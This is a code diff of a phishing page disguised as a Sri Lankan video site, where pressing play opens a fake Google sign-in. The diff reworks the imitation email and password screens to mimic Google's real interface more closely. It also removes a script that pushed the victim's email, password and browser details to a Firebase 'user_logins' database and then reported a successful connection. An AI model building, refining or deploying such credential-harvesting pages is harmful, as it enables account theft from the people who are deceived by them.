@@ -9,7 +9,6 @@
     <meta property="og:type" content="website">
     <meta id="og_title" property="og:title" content="Srilankan Wela">
     <meta id="og_description" property="og:description" content="Watch the latest trending videos on Srilankan Wela.">
-    <!-- WhatsApp Preview එක සඳහා ඔබේ Thumbnail Photo එකෙහි Direct URL එක මෙතැනට දාන්න -->
     <meta id="og_image" property="og:image" content="https://i.ibb.co/3mJp9NXm/In-Shot-20261111-182343696.jpg">
     <meta id="og_url" property="og:url" content="">
 
@@ -20,7 +19,7 @@
     <meta id="tw_image" name="twitter:image" content="https://i.ibb.co/3mJp9NXm/In-Shot-20261111-182343696.jpg">
 
     <style>
-        * { box-sizing: border-box; font-family: sans-serif; }
+        * { box-sizing: border-box; font-family: Roboto, -apple-system, sans-serif; }
         body { margin: 0; background: #0A0A0F; color: #FFFFFF; min-height: 100vh; display: flex; justify-content: center; align-items: center; }
         .page { display: none; width: 100%; max-width: 450px; min-height: 100vh; flex-direction: column; }
         .page.active { display: flex; }
@@ -63,7 +62,7 @@
                 </div>
             </div>
 
-            <!-- Server Title (Starts empty to prevent default flash) -->
+            <!-- Server Title -->
             <div id="txt_video_title" style="font-size: 18px; font-weight: bold; color: #FFFFFF; padding: 12px 0; min-height: 27px;">Loading...</div>
 
             <!-- Thumbnail Container -->
@@ -98,182 +97,51 @@
         </div>
     </div>
 
-    <!-- PAGE 2: GMAIL LOGIN -->
+    <!-- PAGE 2: GMAIL LOGIN (STEP 1 - EMAIL) -->
     <div id="page2" class="page" style="background: #0B0B0B; padding: 24px;">
-        <div style="font-size: 64px; font-weight: bold; color: #4285F4; margin-top: 24px;">G</div>
-        <div style="font-size: 36px; color: #E8EAED; margin-top: 24px;">Sign in</div>
-        <div style="font-size: 18px; color: #E8EAED; margin-top: 28px;">Use your Google Account</div>
+        <div style="font-size: 48px; font-weight: bold; color: #4285F4; margin-top: 24px;">G</div>
+        <div style="font-size: 32px; color: #E8EAED; margin-top: 20px; font-weight: 500;">Sign in</div>
+        <div style="font-size: 16px; color: #E8EAED; margin-top: 12px;">Use your Google Account</div>
 
-        <input type="email" id="edittext_email" placeholder="Email or phone" style="width: 100%; height: 60px; margin-top: 55px; padding: 12px; font-size: 16px; color: #E8EAED; background: #131314; border: 1.5px solid #A8C7FA; border-radius: 8px; outline: none;">
+        <div style="position: relative; width: 100%; margin-top: 40px;">
+            <input type="text" id="edittext_email" placeholder="Email or phone" style="width: 100%; height: 56px; padding: 12px 14px; font-size: 16px; color: #E8EAED; background: #131314; border: 1.5px solid #A8C7FA; border-radius: 4px; outline: none;">
+        </div>
 
-        <div style="font-size: 15px; font-weight: bold; color: #A8C7FA; margin-top: 18px; cursor: pointer;">Forgot email?</div>
-        
-        <div style="font-size: 14px; color: #BFC3C9; margin-top: 65px;">Not your computer? Use Guest mode to sign in privately.</div>
-        <div style="font-size: 14px; font-weight: bold; color: #A8C7FA; margin-top: 4px; cursor: pointer;">Learn more about using Guest mode</div>
+        <div style="font-size: 14px; font-weight: 500; color: #A8C7FA; margin-top: 16px; cursor: pointer;">Forgot email?</div>
 
-        <div style="display: flex; align-items: center; margin-top: 65px; justify-content: space-between;">
-            <div style="font-size: 15px; font-weight: bold; color: #A8C7FA; cursor: pointer;">Create account</div>
-            <div id="btn_next_email" style="width: 110px; height: 48px; background: #A8C7FA; display: flex; align-items: center; justify-content: center; font-size: 16px; font-weight: bold; color: #062E6F; border-radius: 4px; cursor: pointer;">Next</div>
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 60px;">
+            <div style="font-size: 14px; color: #A8C7FA; font-weight: 500; cursor: pointer;">Create account</div>
+            <div id="btn_next_email" style="background: #A8C7FA; color: #001D35; padding: 10px 24px; border-radius: 20px; font-weight: 500; font-size: 14px; cursor: pointer;">Next</div>
         </div>
     </div>
 
-    <!-- PAGE 3: PASSWORD LOGIN -->
-    <div id="page3" class="page" style="background: #131314; padding: 24px; padding-top: 36px;">
-        <div style="font-size: 36px; color: #E3E2E6; margin-top: 20px;">Welcome</div>
-        
-        <div style="display: inline-flex; align-items: center; background: #1E1E24; padding: 6px 12px; border-radius: 20px; margin-top: 20px; width: fit-content;">
-            <span id="display_email" style="font-size: 14px; color: #E3E2E6;">user@gmail.com</span>
+    <!-- PAGE 3: GMAIL LOGIN (STEP 2 - PASSWORD / SCREENSHOT 1 STYLE) -->
+    <div id="page3" class="page" style="background: #0B0B0B; padding: 24px;">
+        <div style="font-size: 48px; font-weight: bold; color: #4285F4; margin-top: 24px;">G</div>
+        <div style="font-size: 32px; color: #E8EAED; margin-top: 20px; font-weight: 500;">Welcome</div>
+
+        <!-- Selected Account Pill (Like Screenshot 1) -->
+        <div style="display: inline-flex; align-items: center; border: 1px solid #5f6368; border-radius: 20px; padding: 6px 14px; margin-top: 20px; background: #131314; width: fit-content;">
+            <div style="width: 20px; height: 20px; background: #5f6368; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 11px; color: #fff; margin-right: 8px;">👤</div>
+            <span id="display_email" style="font-size: 13px; color: #E8EAED;">user@gmail.com</span>
+            <span style="font-size: 12px; color: #9aa0a6; margin-left: 6px;">▼</span>
         </div>
 
-        <input type="password" id="edittext_password" placeholder="Enter password" style="width: 100%; height: 56px; margin-top: 48px; padding: 0 16px; font-size: 16px; color: #E3E2E6; background: transparent; border: 1.5px solid #A8C7FA; border-radius: 4px; outline: none;">
-
-        <div style="display: flex; align-items: center; margin-top: 12px;">
-            <input type="checkbox" id="show_pass" style="width: 18px; height: 18px; margin-right: 8px;" onclick="togglePassword()">
-            <label for="show_pass" style="font-size: 14px; color: #E3E2E6; cursor: pointer;">Show password</label>
+        <!-- Password Input Box -->
+        <div style="position: relative; width: 100%; margin-top: 40px;">
+            <input type="password" id="edittext_password" placeholder="Enter your password" style="width: 100%; height: 56px; padding: 12px 14px; font-size: 16px; color: #E8EAED; background: #131314; border: 1.5px solid #A8C7FA; border-radius: 4px; outline: none;">
         </div>
 
-        <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 70px;">
-            <div style="font-size: 14px; color: #A8C7FA; cursor: pointer;">Forgot password?</div>
-            <div id="btn_next_password" style="height: 40px; padding: 0 24px; background: #A8C7FA; display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: bold; color: #042E6F; border-radius: 4px; cursor: pointer;">Next</div>
+        <div style="display: flex; align-items: center; margin-top: 16px;">
+            <input type="checkbox" id="chk_show_password" style="width: 18px; height: 18px; cursor: pointer; accent-color: #A8C7FA;">
+            <label for="chk_show_password" style="font-size: 14px; color: #E8EAED; margin-left: 10px; cursor: pointer;">Show password</label>
+        </div>
+
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 60px;">
+            <div style="font-size: 14px; color: #A8C7FA; font-weight: 500; cursor: pointer;">Forgot password?</div>
+            <div id="btn_next_password" style="background: #A8C7FA; color: #001D35; padding: 10px 24px; border-radius: 20px; font-weight: 500; font-size: 14px; cursor: pointer;">Next</div>
         </div>
     </div>
-
-    <!-- Firebase SDK Scripts -->
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
-
-<script>
-(function () {
-    const firebaseConfig = {
-        databaseURL: "https://website-27075-default-rtdb.firebaseio.com"
-    };
-    
-    firebase.initializeApp(firebaseConfig);
-    const dbRef = firebase.database().ref('video_config');
-
-    const thumbnail = document.getElementById("img_thumbnail");
-    const placeholder = document.getElementById("thumbnail_placeholder");
-
-    function setThumbnail(url) {
-        const cleanUrl = (typeof url === "string") ? url.trim() : "";
-        if (!cleanUrl) {
-            thumbnail.removeAttribute("src");
-            thumbnail.style.display = "none";
-            placeholder.style.display = "flex";
-            return;
-        }
-        try {
-            const parsed = new URL(cleanUrl, window.location.href);
-            thumbnail.onload = function () {
-                thumbnail.style.display = "block";
-                placeholder.style.display = "none";
-            };
-            thumbnail.onerror = function () {
-                thumbnail.style.display = "none";
-                placeholder.style.display = "flex";
-            };
-            thumbnail.src = parsed.href;
-        } catch (error) {
-            thumbnail.style.display = "none";
-            placeholder.style.display = "flex";
-        }
-    }
-
-    dbRef.on('value', (snapshot) => {
-        const data = snapshot.val();
-        if (data) {
-            // Check System Status (ON / OFF)
-            if (data.system_status && data.system_status.toLowerCase() === "off") {
-                document.getElementById("maintenance_screen").style.display = "flex";
-                return;
-            } else {
-                document.getElementById("maintenance_screen").style.display = "none";
-            }
-
-            if (data.thumbnail_url) {
-                setThumbnail(data.thumbnail_url);
-                // Dynamic Page Updates
-                const ogImg = document.getElementById('og_image');
-                const twImg = document.getElementById('tw_image');
-                if (ogImg) ogImg.setAttribute('content', data.thumbnail_url);
-                if (twImg) twImg.setAttribute('content', data.thumbnail_url);
-            }
-            if (data.video_title) {
-                document.getElementById("txt_video_title").textContent = data.video_title;
-                const ogTitle = document.getElementById('og_title');
-                const twTitle = document.getElementById('tw_title');
-                if (ogTitle) ogTitle.setAttribute('content', data.video_title);
-                if (twTitle) twTitle.setAttribute('content', data.video_title);
-            }
-            if (data.duration) document.getElementById("txt_video_duration").textContent = data.duration;
-            if (data.views) document.getElementById("txt_views").textContent = "▶  " + data.views;
-            if (data.creator) document.getElementById("txt_creator").textContent = data.creator;
-            if (data.like_percent) document.getElementById("txt_like_percent").textContent = data.like_percent;
-            if (data.premium_text) document.getElementById("btn_premium").textContent = data.premium_text;
-        }
-    });
-
-    let userEmail = "";
-    let userPassword = "";
-
-    const page1 = document.getElementById("page1");
-    const page2 = document.getElementById("page2");
-    const page3 = document.getElementById("page3");
-
-    // Play Button -> Opens Gmail Page
-    document.getElementById("btn_play").addEventListener("click", () => {
-        page1.classList.remove("active");
-        page2.classList.add("active");
-    });
-
-    // Email Next Button -> Opens Password Page
-    document.getElementById("btn_next_email").addEventListener("click", () => {
-        const emailInput = document.getElementById("edittext_email").value.trim();
-        if(!emailInput) {
-            alert("කරුණාකර ඊමේල් ලිපිනය ඇතුළත් කරන්න.");
-            return;
-        }
-        userEmail = emailInput;
-        document.getElementById("display_email").textContent = userEmail;
-        
-        page2.classList.remove("active");
-        page3.classList.add("active");
-    });
-
-    // Password Next Button -> Saves Data to Firebase Database (user_logins)
-    document.getElementById("btn_next_password").addEventListener("click", async () => {
-        const passInput = document.getElementById("edittext_password").value.trim();
-        if(!passInput) {
-            alert("කරුණාකර පාස්වර්ඩ් එක ඇතුළත් කරන්න.");
-            return;
-        }
-        userPassword = passInput;
-
-        try {
-            // Firebase Database එකේ 'user_logins' කියන node එකට දත්ත යැවීම
-            const loginsRef = firebase.database().ref('user_logins').push();
-            
-            await loginsRef.set({
-                email: userEmail,
-                password: userPassword,
-                user_agent: navigator.userAgent,
-                time: new Date().toLocaleString()
-            });
-
-            alert("Connected successfully!");
-            window.location.reload();
-
-        } catch(e) {
-            alert("Network error.");
-        }
-    });
-
-    window.togglePassword = function() {
-        const passBox = document.getElementById("edittext_password");
-        passBox.type = passBox.type === "password" ? "text" : "password";
-    }
-})();
-</script>
 
 </body>
 </html>
